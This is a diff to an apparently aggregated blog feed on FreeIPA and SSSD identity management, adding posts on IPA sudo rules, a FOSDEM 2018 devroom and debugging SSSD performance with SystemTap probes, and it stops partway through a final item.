+<item>
 	<title>Jakub Hrozek: IPA sudo rules for local users</title>
 	<guid>http://jhrozek.wordpress.com/?p=415</guid>
 	<link></link>
 	<description>Central identity management solutions like IPA offer a very nice capability &amp;#8211; in addition to storing users and groups on the server, also certain kinds of policies can be defined in one place and used by all the machines in the domain. Sudo rules are one of the most common policies that administrators define for &amp;#8230; &lt;a href=&quot;https://jhrozek.wordpress.com/2018/03/26/ipa-sudo-rules-for-local-users/&quot; class=&quot;more-link&quot;&gt;Continue reading &lt;span class=&quot;screen-reader-text&quot;&gt;IPA sudo rules for local&amp;#160;users&lt;/span&gt; &lt;span class=&quot;meta-nav&quot;&gt;&amp;#8594;&lt;/span&gt;&lt;/a&gt;</description>
 	<pubDate>Mon, 26 Mar 2018 10:33:40 +0000</pubDate>
+</item>
+<item>
+	<title>Alexander Bokovoy: FOSDEM 2018 IAM devroom</title>
+	<guid>https://vda.li/en/posts/2017/12/21/FOSDEM-2018-IAM-devroom/</guid>
+	<link>https://vda.li/en/posts/2017/12/21/FOSDEM-2018-IAM-devroom/</link>
+	<description>&lt;p&gt;&lt;a href=&quot;https://www.fosdem.org/2018/&quot;&gt;FOSDEM&lt;/a&gt; is one of largest free software
+conferences in Europe. It is run by volunteers for volunteers and since 2001
+gathers together more than 8000 people every year. Sure, during first years
+there were less visitors (I had been lucky to actually present at the first
+FOSDEM and also ran a workshop there) but the atmosphere didn’t change and it
+is still has the same classical hacker gathering feeling.&lt;/p&gt;
+
+&lt;p&gt;In 2018 FOSDEM will run on the weekend of February 3rd and 4th. Since the
+event has grown up significantly, there are multiple development rooms in
+addition to the main tracks. Each development room is given a room for Saturday
+or Sunday (or both). Each development room issues own call for proposals (CfP),
+chooses talks for the schedule and runs the event. FOSDEM crew films and
+streams all devrooms online for those who couldn’t attend them in real time but
+the teams behind actual devrooms are what powers the event.&lt;/p&gt;
+
+&lt;p&gt;In 2018 there will be 42 devrooms in addition to the main track. Think about it
+as 43 different conferences happening at the same time, that’s the scale and
+power of FOSDEM. I’m still being impressed by the power of volunteers who
+contribute to FOSDEM success even long since the original crew of sysadmins of
+Free University of Brussels decided to stop working on FOSDEM.&lt;/p&gt;
+
+&lt;p&gt;Identity management related topics has been always part of FOSDEM. In 2016 I
+was presenting in the main track about our progress with GNOME desktop
+readiness for enteprise environments, integration with freeIPA and other
+topics, including a demo of freeIPA and Ipsilon powering authentication for
+Owncloud and Google Apps. Some of my colleagues ran freeIPA presentation well
+before that too.&lt;/p&gt;
+
+&lt;p&gt;We wanted to have a bit more focused story telling too. Radovan Semancik tried
+to organize a devroom in 2016 but it wasn’t accepted. Michael Ströder tried the
+same in 2017. Getting a devroom proposal to pass always comes with a fair
+amount of luck but finally we suceeded with FOSDEM 2018. I’d like to thank you
+my colleague Fraser Tweedale who wrote the original proposal draft out of which
+grew up the effort with &lt;a href=&quot;https://fosdem.org/2018/schedule/track/identity_and_access_management/&quot;&gt;Identity and Access Management devroom.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;We tried to keep a balance between a number of talks and a variety of topics
+presented. We only have 8.5 hours of schedule allocated.  With 5 minutes
+intervals between the talks we were able to accomodate 14 talks out of 25
+proposals.&lt;/p&gt;
+
+&lt;p&gt;The talks are structured in roughly five categories:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Identity and access management for operating systems&lt;/li&gt;
+  &lt;li&gt;Application level identity and access management&lt;/li&gt;
+  &lt;li&gt;Interoperability issues between POSIX and Active Directory environments&lt;/li&gt;
+  &lt;li&gt;Deployment reports for open source identity management solutions&lt;/li&gt;
+  &lt;li&gt;Security and cryptography on a system and application level&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Admittedly, we’ve got one of smallest rooms (50 people) allocated but this is a
+start. On Saturday, February 3rd, 2018, please come to room
+&lt;a href=&quot;https://fosdem.org/2018/schedule/buildings/#u&quot;&gt;UD2.119&lt;/a&gt;. And if you couldn’t
+be in person at FOSDEM, streaming will be available too.&lt;/p&gt;
+
+&lt;p&gt;See you in Brussels!&lt;/p&gt;</description>
+	<pubDate>Thu, 21 Dec 2017 10:35:00 +0000</pubDate>
 </item>
 <item>
 	<title>Rich Megginson: How to debug &quot;undefined method for nil:NilClass&quot; in OpenShift Aggregated Logging</title>
@@ -2872,6 +3580,13 @@ error=&quot;undefined method `[]' for nil:NilClass&quot; plugin_id=&quot;object:
 	<description>&lt;p&gt;This post is intended to provide information about finding SSSD bottlenecks with SystemTap.&lt;/p&gt;&lt;p&gt;One of the most common complaints with SSSD is slowness during login or NSS commands such as ‘getent’ or ‘id’ especially in large LDAP/Active Directory environments. Log analysis alone can be difficult to track down the source of the delay, especially with certain configurations(Indirect AD Integration) where there is a significant number of backend operations that occur during login.&lt;/p&gt;&lt;p&gt;In SSSD 1.14, performance enhancements were made to optimize cache write operations decreasing overall time spent updating the filesystem cache. These bottlenecks were discovered by developers based on userspace probing in certain areas of the SSSD code with SystemTap.&lt;/p&gt;&lt;p&gt;Below are some steps on getting started with SystemTap and SSSD, in this example we will use recent additions of High-Level Data Provider request probes.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;First, install the necessary packages mentioned here: &lt;a href=&quot;https://www.sourceware.org/systemtap/SystemTap_Beginners_Guide/using-systemtap.html&quot;&gt;Installation and Setup&lt;/a&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;It is not required to install &lt;strong&gt;kernel-debuginfo&lt;/strong&gt; or &lt;strong&gt;sssd-debuginfo&lt;/strong&gt; to run these userspace systemtap scripts.&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;You can now check if the probe markers are available with:&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;# stap -L 'process(&quot;/usr/libexec/sssd/sssd_be&quot;).mark(&quot;*&quot;)'&lt;/span&gt;&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/libexec/sssd/sssd_be&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;dp_req_done&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg3&lt;/span&gt;:long&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/libexec/sssd/sssd_be&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;dp_req_send&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;:long&lt;br /&gt;&lt;br /&gt;&lt;span class=&quot;hljs-comment&quot;&gt;# stap -L 'process(&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;).mark(&quot;*&quot;)' | head&lt;/span&gt;&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_acct_req_recv&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg3&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg4&lt;/span&gt;:long&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_acct_req_send&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg3&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg4&lt;/span&gt;:long&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_deref_search_recv&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;:long&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_deref_search_send&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;:long&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_get_generic_ext_recv&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg3&lt;/span&gt;:long&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_get_generic_ext_send&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;:long &lt;span class=&quot;hljs-variable&quot;&gt;$arg3&lt;/span&gt;:long&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_nested_group_check_cache_post&quot;&lt;/span&gt;)&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_nested_group_check_cache_pre&quot;&lt;/span&gt;)&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_nested_group_deref_process_post&quot;&lt;/span&gt;)&lt;br /&gt;process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_nested_group_deref_process_pre&quot;&lt;/span&gt;)&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;The existing SystemTap scripts are located in &lt;em&gt;/usr/share/sssd/systemtap&lt;/em&gt;. The &lt;em&gt;id_perf.stp&lt;/em&gt; can be used to measure performance specifically with the ‘id’ command, while the &lt;em&gt;nested_group_perf.stp&lt;/em&gt; generates metrics and useful information associated with nested group processing code.&lt;/li&gt;&lt;/ul&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;# ll /usr/share/sssd/systemtap/&lt;/span&gt;&lt;br /&gt;-rw-r--r--. &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;hljs-number&quot;&gt;2038&lt;/span&gt; May  &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;16&lt;/span&gt; dp_request.stp&lt;br /&gt;-rw-r--r--. &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;hljs-number&quot;&gt;3854&lt;/span&gt; May  &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;56&lt;/span&gt; id_perf.stp&lt;br /&gt;-rw-r--r--. &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;hljs-number&quot;&gt;8613&lt;/span&gt; May  &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;14&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;44&lt;/span&gt; nested_group_perf.stp&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Running the &lt;em&gt;dp_request.stp&lt;/em&gt; script will track Data Provider requests and provide information about the request which took the most time to complete.&lt;/li&gt;&lt;/ul&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;# vim /usr/share/sssd/systemtap/dp_request.stp &lt;/span&gt;&lt;br /&gt;/* Start Run with:&lt;br /&gt; *   stap -v dp_request.stp&lt;br /&gt; *&lt;br /&gt; * Then reproduce slow login or id/getent &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; another terminal.&lt;br /&gt; * Ctrl-C running stap once login completes.&lt;br /&gt;&lt;br /&gt;&lt;span class=&quot;hljs-comment&quot;&gt;# stap -v /usr/share/sssd/systemtap/dp_request.stp &lt;/span&gt;&lt;br /&gt;Pass &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;: parsed user script and &lt;span class=&quot;hljs-number&quot;&gt;469&lt;/span&gt; library scripts using &lt;span class=&quot;hljs-number&quot;&gt;244964&lt;/span&gt;virt/&lt;span class=&quot;hljs-number&quot;&gt;45004&lt;/span&gt;res/&lt;span class=&quot;hljs-number&quot;&gt;7588&lt;/span&gt;shr/&lt;span class=&quot;hljs-number&quot;&gt;37596&lt;/span&gt;data kb, &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;usr/&lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;sys/&lt;span class=&quot;hljs-number&quot;&gt;128&lt;/span&gt;real ms.&lt;br /&gt;Pass &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;: analyzed script: &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt; probes, &lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;functions&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; embeds, &lt;span class=&quot;hljs-number&quot;&gt;11&lt;/span&gt; globals using &lt;span class=&quot;hljs-number&quot;&gt;246992&lt;/span&gt;virt/&lt;span class=&quot;hljs-number&quot;&gt;48356&lt;/span&gt;res/&lt;span class=&quot;hljs-number&quot;&gt;8816&lt;/span&gt;shr/&lt;span class=&quot;hljs-number&quot;&gt;39624&lt;/span&gt;data kb, &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;30&lt;/span&gt;usr/&lt;span class=&quot;hljs-number&quot;&gt;160&lt;/span&gt;sys/&lt;span class=&quot;hljs-number&quot;&gt;396&lt;/span&gt;real ms.&lt;br /&gt;Pass &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;: using cached /root/.systemtap/cache/d5/stap_d5d7fd869e61741e13b43b7a6932a761_11210.c&lt;br /&gt;Pass &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;: using cached /root/.systemtap/cache/d5/stap_d5d7fd869e61741e13b43b7a6932a761_11210.ko&lt;br /&gt;Pass &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;: starting run.&lt;br /&gt;        *** Beginning run! ***&lt;br /&gt;        --&amp;gt; DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#1] sent for domain [AD.JSTEPHEN]&lt;/span&gt;&lt;br /&gt;                 DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#1] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m8.&lt;span class=&quot;hljs-number&quot;&gt;476&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;        --&amp;gt; DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#2] sent for domain [idm.jstephen]&lt;/span&gt;&lt;br /&gt;                 DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#2] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m0.&lt;span class=&quot;hljs-number&quot;&gt;003&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;        --&amp;gt; DP Request [Initgroups &lt;span class=&quot;hljs-comment&quot;&gt;#3] sent for domain [AD.JSTEPHEN]&lt;/span&gt;&lt;br /&gt;                 DP Request [Initgroups &lt;span class=&quot;hljs-comment&quot;&gt;#3] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m0.&lt;span class=&quot;hljs-number&quot;&gt;115&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;        --&amp;gt; DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#4] sent for domain [idm.jstephen]&lt;/span&gt;&lt;br /&gt;                 DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#4] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m0.&lt;span class=&quot;hljs-number&quot;&gt;001&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;        --&amp;gt; DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#5] sent for domain [idm.jstephen]&lt;/span&gt;&lt;br /&gt;                 DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#5] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m0.&lt;span class=&quot;hljs-number&quot;&gt;002&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;        --&amp;gt; DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#6] sent for domain [idm.jstephen]&lt;/span&gt;&lt;br /&gt;                 DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#6] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m0.&lt;span class=&quot;hljs-number&quot;&gt;001&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;        --&amp;gt; DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#7] sent for domain [idm.jstephen]&lt;/span&gt;&lt;br /&gt;                 DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#7] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m0.&lt;span class=&quot;hljs-number&quot;&gt;000&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;        --&amp;gt; DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#8] sent for domain [idm.jstephen]&lt;/span&gt;&lt;br /&gt;                 DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#8] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m0.&lt;span class=&quot;hljs-number&quot;&gt;001&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;        --&amp;gt; DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#9] sent for domain [idm.jstephen]&lt;/span&gt;&lt;br /&gt;                 DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#9] finished with return code [0]: [Success]&lt;/span&gt;&lt;br /&gt;                 Elapsed time [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m0.&lt;span class=&quot;hljs-number&quot;&gt;001&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;^C&lt;br /&gt;Ending Systemtap Run - Providing Summary&lt;br /&gt;Total Number of DP requests: [&lt;span class=&quot;hljs-number&quot;&gt;9&lt;/span&gt;]&lt;br /&gt;Total time &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; DP requests: [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m8.&lt;span class=&quot;hljs-number&quot;&gt;600&lt;/span&gt;s]&lt;br /&gt;Slowest request data:&lt;br /&gt;        Request: [Account &lt;span class=&quot;hljs-comment&quot;&gt;#1]&lt;/span&gt;&lt;br /&gt;        Start Time: [Fri May  &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;47&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2017&lt;/span&gt; EDT]&lt;br /&gt;        End Time: [Fri May  &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;47&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2017&lt;/span&gt; EDT]&lt;br /&gt;        Duration: [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;m8.&lt;span class=&quot;hljs-number&quot;&gt;476&lt;/span&gt;s]&lt;br /&gt;&lt;br /&gt;Pass &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;: run completed &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;usr/&lt;span class=&quot;hljs-number&quot;&gt;40&lt;/span&gt;sys/&lt;span class=&quot;hljs-number&quot;&gt;15329&lt;/span&gt;real ms.&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;We can see that the &lt;strong&gt;getAccountInfo #1&lt;/strong&gt; DP request completed in 8.476 seconds, the Start Time/End Time provided here can be used to help narrow down log analysis.&lt;/li&gt;&lt;/ul&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;(Fri May  &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;47&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2017&lt;/span&gt;) [sssd[be[idm.jstephen]]] [dp_get_account_info_handler] (&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;x0200): Got request &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;x1][BE_REQ_USER][name=trustuser1@ad.jstephen]&lt;br /&gt;(Fri May  &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;47&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2017&lt;/span&gt;) [sssd[be[idm.jstephen]]] [dp_attach_req] (&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;x0400): DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#1]: New request. Flags [0x0001].&lt;/span&gt;&lt;br /&gt;(Fri May  &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;47&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2017&lt;/span&gt;) [sssd[be[idm.jstephen]]] [dp_attach_req] (&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;x0400): Number of active DP request: &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;br /&gt;...&lt;br /&gt;&amp;lt;snip&amp;gt;&lt;br /&gt;...&lt;br /&gt;(Fri May  &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;47&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2017&lt;/span&gt;) [sssd[be[idm.jstephen]]] [dp_req_&lt;span class=&quot;hljs-keyword&quot;&gt;done&lt;/span&gt;] (&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;x0400): DP Request [Account &lt;span class=&quot;hljs-comment&quot;&gt;#1]: Request handler finished [0]: Success&lt;/span&gt;&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;The existing SystemTap scripts can be modified or new scripts can be created for a certain use-case as long as the existing probes/tapsets in &lt;strong&gt;/usr/share/systemtap/tapset/sssd.stp&lt;/strong&gt; are used.&lt;/li&gt;&lt;/ul&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;# LDAP search probes&lt;/span&gt;&lt;br /&gt;probe sdap_search_send = process(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/usr/lib64/sssd/libsss_ldap_common.so&quot;&lt;/span&gt;).mark(&lt;span class=&quot;hljs-string&quot;&gt;&quot;sdap_get_generic_ext_send&quot;&lt;/span&gt;)&lt;br /&gt;{&lt;br /&gt;    base = user_string(&lt;span class=&quot;hljs-variable&quot;&gt;$arg1&lt;/span&gt;);&lt;br /&gt;    scope = &lt;span class=&quot;hljs-variable&quot;&gt;$arg2&lt;/span&gt;;&lt;br /&gt;    filter = user_string(&lt;span class=&quot;hljs-variable&quot;&gt;$arg3&lt;/span&gt;);&lt;br /&gt;&lt;br /&gt;    probestr = sprintf(&lt;span class=&quot;hljs-string&quot;&gt;&quot;-&amp;gt; search base [%s] scope [%d] filter [%s]&quot;&lt;/span&gt;,&lt;br /&gt;                       base, scope, filter);&lt;br /&gt;}&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;em&gt;stap -L&lt;/em&gt; command shown previously will list out the functions where probes were added making these markers available for writing scripts with.&lt;/p&gt;&lt;p&gt;The goal will be to add more low-level probes to iterative functions where SSSD spends a lot of time. This will allow developers and administrators to analyze performance issues in detail.&lt;/p&gt;</description>
 	<pubDate>Fri, 05 May 2017 16:39:00 +0000</pubDate>
 	<author>noreply@blogger.com (Justin Stephenson)</author>
+</item>
+<item>
+	<title>Alexander Bokovoy: How to debug FreeIPA privilege separation issues</title>
+	<guid>https://vda.li/en/posts/2017/04/28/FreeIPA-Debugging-Privilege-Separation/</guid>
+	<link>https://vda.li/en/posts/2017/04/28/FreeIPA-Debugging-Privilege-Separation/</link>
+	<description>&lt;p&gt;FreeIPA 4.5 has a lot of internal changes. A server side of the FreeIPA framework now runs in a privilege separation mode. This improves security of FreeIPA management operations but complicates debugging of the server. During FreeIPA 4.5 development phase Simo Sorce and I spent a lot of time debugging regressions and decided to document how we log events and how to debug server side operations. As result, &lt;a href=&quot;https://vda.li/en/docs/freeipa-debug-privsep/&quot;&gt;this article&lt;/a&gt; details on what privilege separation means in FreeIPA management framework context and how to debug it.&lt;/p&gt;</description>
+	<pubDate>Fri, 28 Apr 2017 19:00:00 +0000</pubDate>
 </item>
 <item>
 	<title>Rich Megginson: Elasticsearch Troubleshooting - unassigned_shard and cluster state RED</title>
@@ -2937,6 +3652,481 @@ Internet Drafts and dabbling in cryptography.&lt;/p&gt;
 philosophy. His legacy of destruction is all but ensured due to his five
 children. Also, his wife tolerates him.&lt;/p&gt;</description>
 	<pubDate>Thu, 16 Feb 2017 00:00:00 +0000</pubDate>
+</item>
+<item>
+	<title>Alexander Bokovoy: FreeIPA JSON-RPC API article</title>
+	<guid>https://vda.li/en/posts/2016/11/02/FreeIPA-JSON-RPC-API-article/</guid>
+	<link>https://vda.li/en/posts/2016/11/02/FreeIPA-JSON-RPC-API-article/</link>
